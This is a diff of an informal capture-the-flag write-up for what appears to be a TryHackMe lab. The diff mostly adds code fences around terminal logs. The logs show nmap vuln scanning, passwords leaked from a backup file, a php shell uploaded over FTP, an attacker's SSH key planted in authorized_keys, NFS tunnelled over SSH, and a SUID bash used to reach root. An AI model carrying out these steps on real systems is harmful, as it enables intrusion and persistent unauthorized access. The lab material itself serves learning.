@@ -1,3 +1,4 @@
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sCV -A --script=vuln -T5 10.10.50.135
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 09:50 EDT
@@ -185,7 +186,7 @@ Target: http://10.10.50.135/
 [09:52:58] 403 -  226B  - /cgi-bin/.user.ini
 
 Task Completed
-   
+```  
    
    
 backup.zip
@@ -213,7 +214,7 @@ so apparantely the file contained the passwords, so downloading libreoffice so I
 
 libreoffice instal is taking foooooooorrrrrrrrreeeeeeeeeeeeeevvvvvvvvvvveeeeeeeeeeeeerrrrrrrrrrr guess this is the forever day,
 
-fuck it, might as well update shit, and take a break,,, lol
+f***u*** it, might as well update shit, and take a break,,, lol
 
 Par. A. Doxx	paradox	ShibesAreGreat123
 0day Montgomery	0day	OllieIsTheBestDog
@@ -221,7 +222,7 @@ Muir Land	muirlandoracle	A11D0gsAreAw3s0me
 
 we go in ftp, we can upload files, so we upload php shell and execute it on web, or curl 
 
-                                                                                  
+```bash                                                                              
 ┌──(kali㉿kali)-[/hackme/scripts/101]
 └─$ ftp 10.10.50.135
 Connected to 10.10.50.135.
@@ -303,13 +304,13 @@ drwx------  2 paradox paradox   47 Nov 18  2020 .ssh
 -rw-rw-r--. 1 paradox paradox  14K Nov  8  2020 backup.zip
 -rw-------. 1 paradox paradox 3.5K Nov  8  2020 priv.key
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDt1Zh6KMT+FtGv3M2/iCZxBB/xhUnmCe28mWKf227WScN1a1882oulQwxenSufL1OHokZbqOsmVhT4+VTK7grPirOJUp1WhASdT2mMMbbEq3kf3KylAbkVG9QkvLC8T5mYxAeEFWz0gAveOuJBp26K6JQK6IyhWv7B5Whre4DwVBOwKxTHgl1OrE30gUoRXmJutNguwLiDIRATFi6wtkbHDh5lIorxDthPyuY6k8dZvR51Eeq4aCzIUxkaiBcHcROvrqv7BHHN00tk/McAnK1Myp2fUoUV/fv+CsmPLOWCt8672KEaqG7dSqw/I/k9U0C+MVrORrJB6YS6dDcRmTSzTnJuYHdIzdtOSjsiEcIMH3pZolc/fBxCODKSGvHsy7oMQEqydsUFGTS9nrZ2vCfhGJPgfoN/GSvSA7jxTPBUBGj2I7j/3lkvT1D909eFTiwTgKRpXYP7QT3TxEYusQY4FEe95VOeRCO4fGqFaVJqvEx4hYvCXEDNbKPVP2onlpU= root@kali' > .ssh/authorized_keys
-
+```
 
                         
                         
 we ssh in, 
 
-                                                          
+```bash                                                      
 ┌──(kali㉿kali)-[/hackme/scripts/101]
 └─$ sudo chmod 600 paradox                                                     1 ⨯
                                                                                    
@@ -327,7 +328,7 @@ Warning: Permanently added '10.10.50.135' (ECDSA) to the list of known hosts.
 Enter passphrase for key 'paradox': 
 Last login: Sun Jun 27 16:24:11 2021
 [paradox@ip-10-10-50-135 ~]$ 
-
+```
 the tunnels,,,, whooooooooooooaaaaaaaa, 
 
 
@@ -345,7 +346,7 @@ chmod +x linpeas.sh , and re downloaded it, and yeay, got it to run,
 so yea,  you need to be in root directory for the tunnel, 
 
 opened doble ssh 
-
+```bash
 ┌──(kali㉿kali)-[/hackme/scripts/101]
 └─$ sudo ssh paradox@10.10.6.49 -i paradox -L 2049:localhost:2049
 Enter passphrase for key 'paradox': 
@@ -353,10 +354,10 @@ Last login: Sun Jun 27 18:13:46 2021 from 10.6.65.43
 [paradox@ip-10-10-6-49 ~]$ ls
 backup.zip  CustomerDetails.xlsx  CustomerDetails.xlsx.gpg  priv.key
 [
+```
+create mnt directory (which I already have apparently from previous mounts, 
 
-create mnt directory (which I already have apparently from precious mounts, 
-
-
+```bash
 ┌──(kali㉿kali)-[/]
 └─$ sudo mount -t nfs4 localhost:/ mnt                                         1 ⨯
                                                                                    
@@ -385,13 +386,13 @@ thm{3693fc86661faa21f16ac9508a43e1ae}
                                                                                    
 ┌──(kali㉿kali)-[/mnt]
 └─$ sudo chmod +rx .
-  
+```  
   
   
 now on the ssh as paradox
 
 
-
+```bash
 [paradox@ip-10-10-6-49 james]$ /home/james/bash -p
 /home/james/bash: /lib64/libtinfo.so.6: no version information available (required by /home/james/bash)
 bash-5.1# whoami
@@ -402,7 +403,7 @@ root.flag
 bash-5.1# cat root.flag
 thm{a4f6adb70371a4bceb32988417456c44}
 bash-5.1# 
-
+```
 
 
 
